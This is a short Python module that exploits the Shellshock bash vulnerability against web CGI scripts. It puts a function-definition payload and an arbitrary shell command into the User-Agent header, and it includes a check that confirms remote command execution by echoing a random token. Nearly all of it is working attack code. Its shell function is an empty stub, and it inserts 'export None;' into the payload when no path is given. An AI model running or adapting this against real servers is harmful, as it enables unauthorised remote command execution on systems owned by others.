#!/usr/bin/env python3.4
# -*- coding: utf-8 -*-
import requests

from uuid import uuid4


def is_vulnerable(url):
    check = str(uuid4())
    command = "echo {}".format(check)
    resp = send_command(url, command)
    if (check == resp.text[:len(check)]):
        return True
    return False


def get_shell():
    pass


def send_command(url, command, path=None):
    ua = "() { :;};"
    ua += "export {};".format(path)
    ua += "echo 'Content-type: text/plain'; echo; "
    if path:
        ua += "PATH={} ".format(path)
    ua += command 
    ua += "; exit;"
    headers = {"User-Agent": ua}
    return requests.get(url, headers=headers)


__all__ = ["get_shell", "is_vulnerable", "send_command"]
